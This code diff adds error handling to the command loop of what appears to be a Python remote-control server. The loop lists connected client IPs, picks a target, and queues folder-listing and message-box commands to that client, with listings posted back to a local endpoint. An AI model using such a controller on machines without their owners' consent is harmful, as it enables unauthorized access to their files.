@@ -19,22 +19,25 @@ def ioInputTask():
     tip = ""
     while True:
         a = input("cmd:")
-        if a.startswith("ips"):
-            print("-----------online client-----------")
-            print("\n".join(clients['ips']))
-            print("-----------online client end-------")
-        elif a.startswith("target"):
-            ip = a[7:]
-            tip = ip
-            print("chosen target ip %s"%tip)
-        elif a.startswith("ls"):
-            path = a[3:]
-            cmd = add_post_folder("", "http://127.0.0.1:8888/folder",path)
-            clients[tip].put(cmd)
-        elif a.startswith("msg"):
-            msg = a[4:]
-            cmd = add_msgbox("", msg)
-            clients[tip].put(cmd)
+        try:
+            if a.startswith("ips"):
+                print("-----------online client-----------")
+                print("\n".join(clients['ips']))
+                print("-----------online client end-------")
+            elif a.startswith("target"):
+                ip = a[7:]
+                tip = ip
+                print("chosen target ip %s"%tip)
+            elif a.startswith("ls"):
+                path = a[3:]
+                cmd = add_post_folder("", "http://127.0.0.1:8888/folder",path)
+                clients[tip].put(cmd)
+            elif a.startswith("msg"):
+                msg = a[4:]
+                cmd = add_msgbox("", msg)
+                clients[tip].put(cmd)
+        except Exception as e:
+            print(e)
 
 class FileFolderHandler(tornado.web.RequestHandler):
     def post(self):
